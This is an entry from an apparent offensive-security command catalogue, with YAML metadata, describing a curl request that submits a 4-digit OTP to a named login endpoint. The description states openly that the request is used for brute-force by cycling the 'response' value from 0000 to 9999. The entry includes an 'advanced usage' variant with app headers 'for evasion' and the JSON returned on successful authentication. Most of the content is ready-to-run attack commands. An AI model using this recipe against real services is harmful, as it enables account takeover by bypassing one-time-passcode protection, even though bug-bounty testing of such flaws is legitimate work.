---
data: >-
  curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN -H
  "Content-Type: application/json; charset=UTF-8" -H "Affirm-User-Agent:
  Affirm-Android" -H "Affirm-App-Version: 3.62.3" -H "Affirm-App-Version-Code:
  312" -H "Affirm-OS-Version: 22" -d '{"response":"0000"}'
tags:
  - otp
  - brute-force
type: command
output: >-
  HTTP 200 with JSON {"status": "authenticated", "user_id": "1479-5770-XGGL"} on
  success
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.309Z'
id: 5e6fecb3-dfce-4163-81e5-633ccad97309
verified: false
validated: true
submitted: true
---
# Submit OTP for Auth

## Command

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22" \
  -d '{"response":"0000"}'
```

## Description

Submits a 4-digit OTP to the token-specific endpoint for authentication validation. Used in brute-force by varying the 'response' value.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| response | 4-digit OTP/PIN (0000-9999) | Yes |
| SOMETOKEN | Login token from initial request | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN -H "Content-Type: application/json" -d '{"response":"1234"}'
```

### Advanced Usage

With full app headers for evasion:

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN -H "Content-Type: application/json" -H "Affirm-OS-Version: 22" -d '{"response":"0000"}'
```

## Expected Output

On success: HTTP 200 with ~109 bytes JSON {"status": "authenticated", "token": null, "user_id": "1479-5770-XGGL", "expiration": "3019-12-31T17:17:38Z"}. On failure: Different status/length.

## Related

- [[commands/initiate-sms-login-token]]
